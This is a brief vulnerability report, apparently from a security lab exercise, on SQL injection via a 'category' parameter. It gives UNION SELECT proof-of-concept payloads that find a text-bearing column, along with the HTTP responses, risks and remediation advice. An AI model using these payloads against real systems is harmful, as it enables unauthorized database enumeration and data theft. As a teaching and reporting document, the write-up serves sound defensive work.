# Vulnerability Report

## Title

SQL Injection - Finding a Column Containing Text

---

## Severity

High

---

## CWE

CWE-89

---

## OWASP

A03:2021 Injection

---

## Description

The application is vulnerable to SQL Injection via the category parameter.

After determining the number of columns, UNION SELECT was used to identify which column accepts text values.

This enabled the application to display attacker-controlled data.

---

## Affected Parameter

```
category
```

---

## Proof of Concept

Failing Payload

```sql
' UNION SELECT 'abcd',NULL,NULL--
```

Response

```
HTTP 500
```

Successful Payload

```sql
' UNION SELECT NULL,'YUz0R9',NULL--
```

Response

```
HTTP 200 OK
```

The application displayed the injected string.

---

## Risk

- Database Enumeration
- Information Disclosure
- Data Extraction
- Credential Theft

---

## Recommendation

- Prepared Statements
- Parameterized Queries
- ORM
- Input Validation
- Least Privilege Database Accounts

---

## Verification

Successfully reproduced.

Status

✅ Confirmed